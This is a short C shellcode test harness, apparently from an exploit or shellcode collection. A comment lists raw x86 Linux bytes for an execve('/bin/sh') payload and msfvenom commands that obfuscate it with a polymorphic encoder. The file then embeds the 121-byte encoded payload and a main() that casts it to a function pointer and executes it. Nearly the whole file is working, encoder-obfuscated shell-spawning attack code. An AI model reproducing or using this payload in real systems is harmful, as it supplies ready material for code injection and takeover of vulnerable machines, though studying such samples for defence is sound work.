#include<stdio.h>
#include<string.h>

/*
Payload: execve() /bin/sh
$ perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' > shellcode.bin
$ cat shellcode.bin | msfvenom -p - -a x86 --platform linux -f c -e x86/jmp_call_additive -i 3
$ cat shellcode.bin | msfvenom -p - -a x86 --platform linux -f elf -e x86/jmp_call_additive -i 3 > executable
*/

/*Payload size: 121 bytes*/
unsigned char code[] = 
"\xfc\xbb\xec\xbc\x95\x45\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x10\x07\x19\xd0\x93"
"\x70\xc9\xd7\x3d\xd7\x3c\xf6\x6c\xd6\xfd\x83\xae\xac\xf6\x4f"
"\xc6\xa0\x06\xb0\xe9\x4f\xd7\x8b\xb2\x20\x9d\xc4\x08\xbe\x88"
"\xf2\xab\x6c\xde\x60\x2d\xf8\x01\x7a\x1b\x7d\x24\x6f\x89\x2e"
"\xd3\x0d\x48\xfe\x4a\x2c\xfd\xee\x6c\xc3\x30\x2d\x9b\x17\xa1"
"\x26\x29\x59\x9f\xe0\x8b\x9d\xff\x95\x12\x72\x64\x11\x7f\x7e"
"\x87\x02\xda\xad\xa9\x12\x83\x81\xcb\x52\xcb\x25\xf3\x52\xcb"
"\x25";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
